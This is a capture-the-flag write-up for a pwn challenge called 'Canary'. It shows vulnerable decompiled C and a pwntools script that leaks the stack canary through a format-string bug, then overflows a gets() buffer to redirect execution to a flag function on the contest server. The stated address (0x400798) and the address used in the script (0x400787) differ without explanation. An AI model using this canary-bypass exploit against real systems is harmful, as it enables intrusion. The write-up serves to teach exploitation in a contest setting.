# Canary (261 solves)

Simple pwn challenge, requires leaking cookie with format sting vulnerability and overwriting ret address with buffer overflow.



The binary contains **flag** function at **0x400798** which we have to call to get the flag.

```c++
int flag()
{
  return system("/bin/cat flag.txt");
}
```

```c++
void greet()
{
  char format; 
  char v1; 
  unsigned long long v2; 

  cookie = __readfsqword(0x28u);
  printf("Hi! What's your name? ");
  gets(&format);
  printf("Nice to meet you, ");
  strcat(&format, "!\n");
  printf(&format);					// leak cookie
  printf("Anything else you want to tell me? ");
  gets(&v1);						// overwrite ret
}
```

Solution:

```python
from pwn import *
import re

def leak(r):
    payload = b''
    payload += b'%17$llx'
    r.sendlineafter('name? ', payload)
    raw = r.recvuntil('Anything')
    cookie = re.findall('you, (.*)!\n', raw.decode())[0]
    return int(cookie, 16)

if __name__ == "__main__":

    flag = 0x400787

    r = remote('shell.actf.co', 20701)
    c = leak(r)

    payload  = b''
    payload += b'A' * 56	# padding
    payload += p64(c)       # cookie
    payload += b'B' * 8		# padding
    payload += p64(flag)    # print flag	

    r.sendlineafter('tell me?', payload)
    r.interactive()
```

```bash
$ python3 solve.py
[+] Opening connection to shell.actf.co on port 20701: Done
[*] Switching to interactive mode
 actf{youre_a_canary_killer_>:(}
Segmentation fault
```

